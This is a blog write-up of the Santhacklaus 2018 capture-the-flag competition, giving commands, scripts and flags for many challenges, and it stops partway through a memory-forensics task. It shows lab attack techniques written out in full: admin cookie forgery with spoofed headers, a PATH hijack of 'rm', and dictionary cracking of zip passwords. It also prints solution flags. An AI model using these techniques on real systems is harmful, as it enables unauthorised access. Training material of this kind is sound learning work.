---
author: "Maki"
title: "Santhacklaus 2018"
slug: "santhacklaus2018"
date: 2018-12-19
description: "Individual CTF made by Pinkflood from IMT Lille (France)."
---

# Bonjour

<center>

| Event        | Challenge | Category      | Points | Solves     |
|--------------|-----------|---------------|--------|------------|
| Santhacklaus | Bonjour   | Rules         |   0    | 400   |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_bonjour.png)
_Fig 1_: Bonjour statement
</center>

## Flag

This challenge is maybe the hardest one. You have to copy and paste the right flag!

> IMTLD{BaguetteForXMAS}

# I got 404 problems

<center>

| Event        | Challenge            | Category      | Points | Solves     |
|--------------|----------------------|---------------|--------|------------|
| Santhacklaus | I got 404 problems   | Web           |   50    | ~ 300   |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_404.png)
_Fig 1_: "I got 404 problems" statement
</center>

## Curling

Just go on 404 Not Found page:

```bash
curl "https://santhacklaus.xyz/bitedepoulet" | grep IMT
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4469  100  4469    0     0      0      0 --<p class="text-center" style="color:#999999;"></br>IMTLD{Th3_P4g3_w4s_n0T_f0uNd}</br></p>
100  4469  100  4469    0     0    745      0  0:00:05  0:00:05 --:--:--   985
```

## Flag

Then the flag:

> IMTLD{Th3_P4g3_w4s_n0T_f0uNd}

# Playa del fuego

<center>

| Event        | Challenge            | Category      | Points | Solves     |
|--------------|----------------------|---------------|--------|------------|
| Santhacklaus | Playa del fuego      | Forensic      |   50    | ~ 300   |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_playa.png)
_Fig 1_: "Playa del fuego" statement
</center>

## Copy & Paste

I just opened the PDF file, and saw the little black rectangle at the bottom... 

<center>
![](/img/writeups/santhacklaus2018/playa1.png)
_Fig 1_: "Playa del fuego" statement
</center>

Tried `CTRL-A / CTRL-C / CTRL-V` in my favorite text editor, and voila!

## Flag

> IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}


# Trashhack

<center>

| Event        | Challenge      | Category                  | Points | Solves     |
|--------------|----------------|---------------------------|--------|------------|
| Santhacklaus | Trashhack      | Non-Dgitial Forensic      |   50    | ~ 200   |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_trashhack.png)
_Fig 1_: "Trashhack" statement
</center>

## Wrinkle eyes

In this challenge, we're starting with this picture:

<center>
![](/img/writeups/santhacklaus2018/trashhack1.jpg)
_Fig 2_: Piece of paper found in trash
</center>

## Flag

If you read carrefuly you're able to see:

> IMTLD{P4P3R}

# Haystack

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Haystack       | Rules         |   50    | ~ 200     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_haystack.png)
_Fig 1_: "Haystack" statement
</center>

## Grep, grep everywhere

We're starting with this kind of text file:

```raw
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
IMTLD(0e19c81165be3fd14916bc296eff592b)
IMTLD{bde443a465e270719a63065a496cbf8e]
IMTLD9f553b427052a3e4d484532eed0d80da
[...]
```

After downloading this file, just grep with the right flag format:

```bash
cat a.txt| grep 'IMTLD{' | grep '}'
```

## Flag

> IMTLD{26650fdec09ef3ac4b602a79a0384306}

# Slept on the keyboard

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Slept on the keyboard       | Crypto         |   100    | ~ 200     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_sleptkeyboard.png)
_Fig 1_: "Slept on the keyboard" statement
</center>

## Counting

<center>
![](/img/writeups/santhacklaus2018/qrcode_1.png)
_Fig 2_: QRCode
</center> 

Decoding time, the QR Code give us binary number. With the following perl command found on stackoverflow, I was able to convert binary to ascii:

```bash
zbarimg -q --raw qrcode.png | perl -lpe '$_=pack"B*",$_'
9999dddd44444cccc4444bbbbbbb33334444444444000eeeeee44444888888333bbbb33399999992222220004442222222444444ddddddd
```

At this time, it tooks me several minutes to understand what I had to do. In fact, the solution is quite easy: just count.

* 9999 -> 49
* dddd -> 4d
* 44444 -> 54
* cccc -> 4c
* 4444 -> 44

```bash
echo -n '494d544c44' | xxd -r -p
IMTLD 
```

## Flag

```bash
echo -n '494d544c447b433474306e5468334b337962303472647d' | xxd -r -p
IMTLD{C4t0nTh3K3yb04rd}
```

# What's his name

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | What's his name       | Rules         |   100    | ~ 150     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_name.png)
_Fig 1_: "What's his name" statement
</center>

## Wireshark you said?

Just open the PCAP file in Wireshark and then `Follow TCP stream`:

<center>
![](/img/writeups/santhacklaus2018/name1.png)
_Fig 2_: "What's his name" statement
</center>

## Flag

> IMTLD{W4tch4_W4tch4}

# Authentication 2.0

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Authentication 2.0       | Web         |   100    | ~ 150     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_auth20.png)
_Fig 1_: "Authentication 2.0" statement
</center>

## Curling

So, on the above link we found:

<center>
![](/img/writeups/santhacklaus2018/auth20_1.png)
_Fig 2_: Web page of the Authentication 2.0
</center>

Ok, what could happen if I change the HTTP Method ?

```bash
curl -X POST https://authentication.santhacklaus.xyz/
[...]
        <div class="code green">
          <h1>POST</h1>
        </div>

      
        <div class="sub red">
          <h2>What is your username?</h2>
        </div>
[...]
```

We can notice 2 things:

1. The method used is reflected
2. The main message changed, it's asking for a username

Now, let's try to give the admin username:

```bash
curl -X POST -d "username=admin" https://authentication.santhacklaus.xyz/
[...]
        <div class="sub">
          <h2 class="blue">Hello admin</h2>
          <h3 class="grey">IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}</h3>
        </div>
[...]
```

## Flag

> IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}

# Xtracted

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Xtracted       | Crypto         |   100    | ~ 150     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_xtracted.png)
_Fig 1_: "Xtracted" statement
</center>

## Brainfuck

The given file contains some brainfuck code:

```raw
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++.-.++++.+.<++.+++++++++++++++.---------------.>------------.++++++++++++..----.<+++++++++++++++.++.---.+++.<++++++++++.>>--------.>+++++++++++.++++.+.<<+++++++++.<++++++++++++++++++++++.>-----.----.---.+++++++++.--.-------.++++.--.++.----.+++..++.<++++++++++.>>-----.>-----.-.++++++.---------------.+++++++++.++++++.<<------.>+++++++++++++++++.>+++++.---------.-----------.<<+++++++++++++.<++++++++++++++++++++++.>>>----.+++++++++++++++..----.---.------.--.+++++++++++++++++++.-----------.++++++.-.<<-----------.>>++++++++++.<<--.>>-...<<.>>-----------------.+++++++++.+++.-----.<<.>>++++++++.---.------.-------.+++++++++.-----------.++++++++++++.-----------.+.-.<<<++++++++++.>>>+.+++++++++++++++++++.----.--.<+++++++++++++.++.>++.<++++++.>-----.-.<----------.>-----.+++++.<+++++++.>+.<<++++++++++++++++.++++++++++++.++++.+++++++.--------.--------.>>++++++++++++.<--------------.>-------.--.<<----------------.>+++++++++++.>++.<----.<++++++++++++++++.----------------.>>.<<.>.-----------.<----.>+++++++++++.>--.<<+++.>>-----.<<---.>>+++++++.<<+++.>.>-.<<.>>-.++++.<<.>-------------.>+++++++.
```

A little request on google, the following website did the job:

> https://copy.sh/brainfuck/

After running the brainfuck code:

```raw
POST / HTTP/1.1Host:*51.75.202.1134Content-Type:Japplication/x-www-form-urlencodedTextraction_info=IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}
```

## Flag

> IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}

# Stego101

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Stego101       | Stega         |   150    | ~ 150     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_stego101.png)
_Fig 1_: "Stego101" statement
</center>

## Steghide

<center>
![](/img/writeups/santhacklaus2018/stego101_1.jpg)
_Fig 2_: Start picture
</center>

With an image, I always start looking metadata:

```bash
exiftool challenge.jpg
[...]
X Resolution                    : 300
Y Resolution                    : 300
Comment                         : steghide : doyouknowdaway
Image Width                     : 297
Image Height                    : 153
Encoding Process                : Baseline DCT, Huffman coding
[...]
```

Steghide will store a little encypted container in a picture and use a passphrase, let's try to decrypt it with `doyouknowdaway` as passphrase.

```bash
steghide extract -sf challenge.jpg
Enter passphrase: doyouknowdaway
wrote extracted data to "flag.txt".%
```

## Flag

And then in `flag.txt`:

> IMTLD{st3g4N0gr4phY_c4N_b3_r34llY_s1mpl3}

# Crackme_1

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Crackme_1       | Crackme         |   150    | ~ 150     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_crackme1.png)
_Fig 1_: "Crackme_1" statement
</center>

## ltrace

The program is asking for a password. Let's ltrace this program:

```bash
ltrace ./crackme_1 bitedepoulet
strlen("hackerman")                              = 9
strlen("hackerman")                              = 9
puts("Password incorrect")                       = 19
Password incorrect
+++ exited (status 0) +++
```

The password looks to be `hackerman`.

## Flag

```bash
./crackme_1 hackerman
Access granted !
Flag : IMTLD{Y0uAr34H4ck3rH4rry}
```
# Menthal arithmetic

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Menthal arithmetic       | Prog         |   150    | ~ 120     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_menthalarithmetic.png)
_Fig 1_: "Menthal arithmetic" statement
</center>

```bash
nc 51.75.202.113 10001

Welcome !!
You must calculate the square root of the 1st number, multiply the result by the cube of the 2nd number and send the integer part of the final result...
I almost forget, you only have 2 seconds to send me the result
1st number : 5356 
2nd number : 8639
```

## Scripting time

So, the first and the second number are changing, but the operation remains the same. Here is the operation:

<center>
![](/img/writeups/santhacklaus2018/ari1.png)
_Fig 2_: Math formula
</center>

I used `pwn` library for the netcat connection, it's much more easier than `socket` or others lib.

## Final script

```python
#!/usr/bin/python2

from pwn import *
import math

r = remote("51.75.202.113", 10001)
sleep(0.5)
print r.recvuntil("have 2 seconds to send me the result")
sleep(0.5)
#print r.recv(4096).split('\n')

statement = r.recv(4096).split('\n')

num1 = statement[1].split(' ')[3]
num2 = statement[2].split(' ')[3]

num1sqrt = math.sqrt(float(num1))
num2cube = math.pow(float(num2),3)
res = int(num1sqrt * num2cube)

r.sendline(str(res))
print r.recv(4096)
```

## Flag

```bash
./decode.py
Congratz!! Flag : IMTLD{TheFastestManAlive}
```

# The flag grabber

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | The flag grabber       | Web         |   150    | ~ 120     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_flaggrabber.png)
_Fig 1_: "The flag grabber" statement
</center>

## JavaScript is amazing

<center>
![](/img/writeups/santhacklaus2018/flaggrab1.png)
_Fig 2_: Base index
</center>

The `I want my flag!` button is following the mouse, it's pretty annoying, let's remove the JavaScript code.

In fact, I removed all JavaScript code in the webpage (using the firefox webconsole), removed the `div` containing the button and edit the `id` of the `form`:

<center>
![](/img/writeups/santhacklaus2018/flaggrab2.png)
_Fig 3_: Cute button appears
</center>

A new button appeared, let's click on it :D

## Flag

<center>
![](/img/writeups/santhacklaus2018/flaggrab3.png)
_Fig 4_: Flag
</center>

> IMTLD{J4v4scRipT_iS_W0nD3rFuL} 

# On the road again

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | The flag grabber       | Web         |   150    | ~ 120     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_ontheroad.png)
_Fig 1_: "On the road again" statement
</center>

## State of the art

When you're logged on, you only have 2 files:

* ch1
* ch1.c

The C file contains the following code:

```C
#include <stdio.h>
#include <stdlib.h>

int main(void) {

    system("rm /home/challenger1/.flag");
    return 0;

}
```

Ok, then this program simply call the `rm` command, there is an old trick by changing the `PATH` variable to hook a system command.

## Hook

First, I have to create a script called `rm` somewhere with write permission, `tmp` folder seems to be a great choice.

```bash
$ echo '#!/bin/cat' > /tmp/rm
$ cat /tmp/rm
#!/bin/cat 
$ chmod +x /tmp/rm
```

And now, we have to change the `PATH` in order to call our custom script instead of the real `rm` command.

```bash
$ PATH=/tmp
```

## Flag

```bash
$ ./ch1
#!/bin/cat
IMTLD{Th1s0neW4sSymPATH3t1c2}
```

# Pong

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Pong       | Network         |   200    | ~ 60     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_pong.png)
_Fig 1_: "Pong" statement
</center>

## State of the art

Start with a PCAP file. With this title, it must contains ICMP packets. I just opened `tshark`:

```bash
$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.text
[Some base64 stuff]
```

Ok, then let's remove all line return and decode it:

```bash
$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.text | tr -d '\n' | base64 -d > file.out

$ file file.out
file.out: PNG image data, 487 x 272, 8-bit/color RGBA, non-interlaced
```

## Flag

<center>
![](/img/writeups/santhacklaus2018/pong_1.png)
</center>

# QREncoded

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | QREncoded       | Prog         |   200    | ~ 120     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_qrencoded.png)
_Fig 1_: "QREncoded" statement
</center>

## State of the art

Ok, we're starting with a Zip archive containing... 843 QRCodes!

<center>
	<img src="https://media.giphy.com/media/r1HGFou3mUwMw/giphy.gif">
</center>

## Scripting time... Or not

In fact, I don't have to script something because the `zbar` tool in Linux is used to decode QRCode. I only did a little loop, concatenate the base64 in output and decode the data.

```bash
$ for i in {0..843}; do zbarimg -q --raw part_$i.png; done | tr -d '\n' | base64 -d > file.out
$ file file.out
file.out: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.6, datetime=2018:11:15 22:24:26], progressive, precision 8, 423x532, components 3
```

## Flag

<center>
![](/img/writeups/santhacklaus2018/qrencoded_1.jpg)
_Fig 2_: Flag
</center>

# love.

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | love.       | Web         |   200    | ~ 100     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_love.png)
_Fig 1_: "love." statement
</center>

## State of the art

The __key.pub__ file is not a real PGP key. In fact, if you remove the header and the footr and only keep the base64 data, you can decode it and get a SVG file.

```bash
$ cat key.pub | tail -n+4 | head -n-1 | base64 -d > file.svg
```

## inkscape

This is a SVG editor, honestly, it's not user friendly, it's ugly and I don't like to use it. I don't have other choice :-(

<center>
![](/img/writeups/santhacklaus2018/love_1.png)
_Fig 2_: SVG opened in inkscape
</center>

In inkscape, you can list all SVG object with this feature:

> Object > Objects...

<center>
![](/img/writeups/santhacklaus2018/love_2.png)
_Fig 3_: New panel
</center>

Ok, now you can hide see something strange when you go through the __g1391__ object:

<center>
![](/img/writeups/santhacklaus2018/love_3.gif)
_Fig 4_: Little element everywhere
</center>

I think all those little element composed the flag. And now, we have to understand how to use this f\*cking software :)

## Flag

I just hide the white rectangle on the front, played with opacity and... Tada:

<center>
![](/img/writeups/santhacklaus2018/love_4.png)
_Fig 5_: Flag
</center>

# SRHT

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | SRHT       | Web         |   200    | ~ 100     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_srht.png)
_Fig 1_: "SRHT" statement
</center>

## State of the art

At the first visit, we're seeing the index page:

<center>
![](/img/writeups/santhacklaus2018/srht_1.png)
_Fig 2_: Index page at first connection
</center>

And after a refresh, we are reading this:

<center>
![](/img/writeups/santhacklaus2018/srht_2.png)
_Fig 3_: Index page at second connection
</center>

## Cookie

Obiously, the website is remembering me. How? I think about those element:

* Log IP address
* Generate a cookie

The easiest one to check was the cookie:

<center>
![](/img/writeups/santhacklaus2018/srht_3.png)
_Fig 4_: Cookie
</center>

The cookie looks to `SHA256` hash, let's try to crack it on crackstation.net:

<center>
![](/img/writeups/santhacklaus2018/srht_4.png)
_Fig 5_: Hash cracked
</center>

Hmmm.. `stranger` ? What could happen if I'm setting my cookie with the SHA256 of `admin` ?

```bash
$ echo -n 'admin' | sha256sum
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918  -
```

<center>
![](/img/writeups/santhacklaus2018/srht_5.png)
_Fig 6_: Almost admin
</center>

## Curling again

Ok, now I have to configure my `User-Agent` and `Referer` HTTP Headers:

```bash
$ curl -H "User-Agent: Black Hat Browser" \
	-H "Referer: russian.deep-web.org" \
	--cookie "connexion=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" \
	https://srht.santhacklaus.xyz/
[...]
<li><a href="">Consult secret documents</a></li>
</ul>
</br> Well done ! Take your flag: IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}</div>
</center>
[...]
```

## Flag

> IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}

# Trollologuess

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Trollologuess       | GUESSIIIIIIING         |   200    | ~ 10     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_trollologuess.png)
_Fig 1_: "Trollologuess" statement
</center>

## State of the art

In this challenge, the entry point is a f\*cking PNG file. After downloading it, I immediatly runs `binwalk` on it:

```bash
$ binwalk challenge.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1920 x 1080, 8-bit/color RGBA, non-interlaced
136           0x88            Zlib compressed data, best compression
1340310       0x147396        gzip compressed data, from Unix, last modified: 2018-12-18 01:39:10
```

Hmmm... I'm not an expert, but I think PNG files doesn't embed gzip archive usually! For the extraction, sometimes binwalk is a bit whimsical. To force an extraction we have to use `--dd=".*"` argument:

```bash
$ binwalk --dd=".*"
[Same output as above]

$ file _challenge.png.extracted/*
_challenge.png.extracted/0:      PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced
_challenge.png.extracted/147396: gzip compressed data, last modified: Tue Dec 18 01:39:10 2018, from Unix
_challenge.png.extracted/88:     zlib compressed data

$ mv _challenge.png.extracted/147396 dick.gz
$ file dick.gz 
dick.gz: gzip compressed data, last modified: Tue Dec 18 01:39:10 2018, from Unix

$ gzip -d dick.gz
$ file dick 
dick: POSIX tar archive (GNU)

$ tar xvf dick
step1.zip
step2.zip 
step3.zip

$ unzip step1.zip
$ file step1
step1: PNG image data, 1500 x 1000, 8-bit/color RGB, non-interlaced
```

Ok, go guessing.

<center>
![](https://media.giphy.com/media/26BRPdtti5poNUoU0/giphy.gif)
</center>

## Step1

Here is the picture:

<center>
![](/img/writeups/santhacklaus2018/guess_step1.png)
_Fig 2_: Step1
</center>

Because I'm corporate with my team, I'm using: https://aperisolve.fr

Zeecka made this tool to analyze picture, it's like stegsolve and zsteg with a web front. Very cool.

And in zsteg output we can find:

> b1,r,lsb,yx .. text: "1_H0p3_U_st1ll_h4v3_h0p3"

So:

```bash
$ unzip step2.zip
Archive step2.zip 
[step2.zip] Password: 1_H0p3_U_st1ll_h4v3_h0p3
  inflating: step2

$ file step2
step2: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, frames 3 
```

## Step2

Here is the picture:

<center>
![](/img/writeups/santhacklaus2018/guess_step2.jpg)
_Fig 3_: Step2
</center>

I spent loooooooot of time on this one, really. After a long time, I finally find a tool: `outguess`
Available in my Ubuntu repository.

This tool needs a password, then I guess it was __WHAT__, because the tool is __OUTGUESS__.

```bash
$ outguess -k WHAT -r step2.jpg bitedepoulet
Reading step2.jpg....
Extracting usable bits:   62448 bits
Steg retrieve: seed: 26, len: 43

$ cat bitedepoulet
Pass for step3 is AreUr34Dy_4_wh4T5_C0minG

$ unzip step3.zip
Archive step3.zip 
[step3.zip] Password: AreUr34Dy_4_wh4T5_C0minG
  inflating: step3

$ file step3
step3: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 11025 Hz
```

## Step3

The real deal is here. Still with a pinch of guessing, which CTF with an annoying WAV file `Shutdown` did...

<center>
![](https://media.giphy.com/media/3oz8xP6SaSkSU9dhcI/giphy.gif)
</center>

Yes! `European Cyber Week Quals`, and who did a little writeups about some tasks? :D

So you can find the trick here: https://maki.bzh/courses/blog/writeups/qualecw2018/#drone-wars-1

I will try to be a bit me explicit in this here. I followed this tutorial: https://www.chonky.net/hamradio/decoding-sstv-from-a-file-on-a-linux-system

First, you need to install `QSSTV` and `vlc` on linux, I'm using Ubuntu 16.04.

```bash
$ sudo apt install qsstv vlc 
$ pactl load-module module-null-sink sink_name=virtual-cable
24
```

Now you have an audio virtual cable created, the `Null output`. You have to set your system to use this virtual cable for sounds in `QSSTV` and `VLC`. In `pavucontrol` you can follow the above link. 

Here is an ugly GIF:

<center>
![](/img/writeups/santhacklaus2018/guess_step3.gif)
</center>

## Flag

<center>
![](/img/writeups/santhacklaus2018/guess_flag.png)
</center>

# Can you SEE the flag

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Can&nbsp;you&nbsp;SEE&nbsp;the&nbsp;flag       | "Stegoguess"         |   200    | ~ 25     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_seeflag.png)
_Fig 1_: "Can you SEE the flag" statement
</center>

## State of the art

Let's start with a Zip again. The archive is password protected. `fcrackzip` will found the password:

```bash
$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt Video.zip
found file 'Why ?.mp4', (size cp/uc 23018221/23033977, flags 9, chk 8c48)


PASSWORD FOUND!!!!: pw == cheese

$ unzip Video.zip 
Archive:  Video.zip
[Video.zip] Why ?.mp4 password: cheese
  inflating: Why ?.mp4
```

## Some shitty QR Code

Ooooooooook, I found a QR Code in the video, first, I tried to split the video into picture:

```bash
$ ffmpeg -i ../Why\ \?.mp4 -r 1000 -f image2 image-%07d.jpg
```

Bad idea. It filled my disk. Thanks. 

<center>
![](https://media.giphy.com/media/5mYpn1V4082JLmLKvy/giphy.gif)
</center>

## Extracting the sound

After this failed, I tried to extract the sound as WAV file:

```bash
$ ffmpeg -i ../Why\ \?.mp4 bitedepoulet.wav 
```

With a WAV in steganography, the first move should be the spectrum analysis. I used `spek` first:

<center>
![](/img/writeups/santhacklaus2018/seeflag_1.png)
</center>

On the right of the picture, it looks to have some characters, I framed them in red. At this point, I decided to open the WAV file in Audacity, and edit frequency range:

<center>
![](/img/writeups/santhacklaus2018/seeflag_2.gif)
</center>

## Flag

> IMTLD{50Sh4d3dOfS0ng}

# Some chinese stuff challenge

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Chinese       | "Fuck"         |   250    | ~ 25     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_chinois.png)
_Fig 1_: "Chinese" statement
</center>

## State of the art

We're starting the challenge with this text file: https://mega.nz/#!rLRVUIQR!P4T2Dg4b5jnAGJZOlgr683XsbiFmjEu1tJnNA_bN1is

## Counting

After a few hours, I realize that there is only one thing to do, to count the different Chinese characters. Hopefully, it will unlock me.

```python
>>> #!/usr/bin/python3
>>> f = open('challenge.txt', 'r')
>>> dat = f.read()
>>> f.close()
>>> print(len(collections.Counter(dat)))
65
```

There are 65 different chinese characters. After few moments again, I realized that the base64 charset is made of 65 characters too.

## Find and replace

I have to replace chinese characters by base64 characters. Ok, how? In fact, every characters has a Unicode code (given with ord function in python for example). 

So, you have to sort the Chinese characters and the base64 charset from the smallest to the highest. After that, let's try to replace each char:

```python
>>> chinois = ''.join(sorted(collections.Counter(dat).keys()))
>>> charset = ''.join(sorted(string.ascii_letters+string.digits+'/+='))
>>> trantab = dat.maketrans(chinois,charset)
>>> print(dat.translate(trantab))
[...]
NyZWF0ZQAyMDE4LTEwLTI2VDEyOjQwOjU2KzAyOjAw7UNvwAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0xMC0yNlQxMjo0MDo1NiswMjowMJwe13wAAAAASUVORK5CYII=
>>> base64.b64decode(dat.translate(trantab))
tEXtdate:modify\x002018-10-26T12:40:56+02:00\x9c\x1e\xd7|\x00\x00\x00\x00IEND\xaeB`\x82
```

The base64 ends with `=` ! It smells good. Moreover, the decoded data contains `IEND` at the end, it looks to be a PNG file.

## Final script

```python
#!/usr/bin/python3

import collections
import string 
import base64

f = open('challenge.txt', 'r')
dat = f.read()
f.close()

# len(string.ascii_letters)+len(string.digits)+len('/+=')
print(len(collections.Counter(dat))) 

chinois = ''.join(sorted(collections.Counter(dat).keys()))
charset = ''.join(sorted(string.ascii_letters+string.digits+'/+='))
trantab = dat.maketrans(chinois,charset)

decoded_file = base64.b64decode(dat.translate(trantab))

g = open('flag.png','wb')
g.write(decoded_file)
g.close()
```

## Flag

<center>
![](/img/writeups/santhacklaus2018/chinois_1.png)
_Fig 2_: "Chinese" flag
</center>

# Volatility101

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Volatility101       | Forensic         |   250    | ~ 90     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_vol101.png)
_Fig 1_: "Volatility101" statement
</center>

## State of the art

It's a Windows 7 memory dump:

```bash
$ volatility -f challenge.dmp imageinfo

          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/monique/Téléchargements/vol101/challenge.dmp)
                      PAE type : No PAE
                           DTB : 0x185000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2018-11-06 13:24:59 UTC+0000
     Image local date and time : 2018-11-06 14:24:59 +0100
```

## Step 1

There are two methods: a clean one and a dirty one.

### Clean method

```bash
$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 printkey -K "ControlSet001\Control\ComputerName\ActiveComputerName"

Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ActiveComputerName (V)
Last updated: 2018-11-06 13:23:49 UTC+0000

Subkeys:

Values:
REG_SZ        ComputerName    : (V) WELC0M3
```

### Dirty method

```bash
$ strings challenge.dmp| grep "COMPUTERNAME=" | sort | uniq
COMPUTERNAME=WELC0M3
```

> part1 = WELC0M3

## Step 2

I highly recommend to store all your volatility output, it's easier if you need additional information later.

```bash
$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 filescan > filescan.txt
$ cat filescan.txt | grep Desktop | grep zip 
0x000000003e067440      8      0 RWD--- \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
```

> part2 = toTh3

## Step 3

```bash
$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e067440 -D . 
DataSectionObject 0x3e067440   None   \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip

$ file file.None.0x85db26e0.dat
file.None.0x85db26e0.dat: Zip archive data, at least v1.0 to extract

$ mv file.None.0x85db26e0.dat toTh3.zip 
$ 7za x toTh3.zip 
[...]
Enter password (will not be echoed):
```

Crap, password protected zip. First thing to do with an encrypted zip in a CTF, trying to bruteforce it with `fcrackzip` and `rockyou` as dictionnary:

```bash
$ fcrackzip -v -D -u -p rockyou.txt toTh3.zip
found file 'part3.txt', (size cp/uc     25/    13, flags 9, chk 5069)
checking pw jimmywimmy                              

PASSWORD FOUND!!!!: pw == iamahacker

$ 7za x toTh3.zip 
[...]
Enter password (will not be echoed): iamahacker
Everything is Ok
Archives with Warnings: 1
Warnings: 1
Size:       13
Compressed: 4096

